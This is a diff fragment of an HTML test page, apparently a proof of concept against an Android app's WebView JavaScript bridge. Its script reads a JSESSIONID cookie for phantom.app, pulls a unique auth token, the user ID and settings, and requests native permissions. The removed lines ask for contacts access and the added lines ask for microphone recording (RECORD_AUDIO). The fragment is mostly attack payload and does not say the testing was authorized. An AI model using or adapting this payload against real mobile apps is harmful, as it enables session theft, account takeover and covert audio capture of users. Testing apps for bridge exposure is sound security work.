@@ -13,13 +13,15 @@
     <body>
 	
 	<script>
-		alert(JavascriptInterface.getCookie('https://phantom.app/','JSESSIONID'));
-		JavascriptInterface.requestNativePermission("android.permission.READ_CONTACTS");       	
-		alert(JavascriptInterface.getUniqueAuthToken());
-		alert(JSInterface.getUserId());
+		alert(JAVASCRIPT_INTERFACE.getCookie('https://phantom.app/','JSESSIONID'));
+		JAVASCRIPT_INTERFACE.requestNativePermission("android.permission.RECORD_AUDIO");
+		permissionRequest.getResources("android.permission.RECORD_AUDIO");  
+		JAVASCRIPT_INTERFACE.permissionRequest("android.permission.RECORD_AUDIO");  
+		alert(JAVASCRIPT_INTERFACE.getUniqueAuthToken());
+		alert(JAVASCRIPT_INTERFACE.getsettings());
 		alert(JAVASCRIPT_INTERFACE.getUserId());
-		alert(JSInterface.getUserId());
-		alert(RNCWebView.getUserId());
+		alert(JAVASCRIPT_INTERFACE.getUserId());
+		alert(JAVASCRIPT_INTERFACE.getUserId());
 	</script>
 	
 	</body>
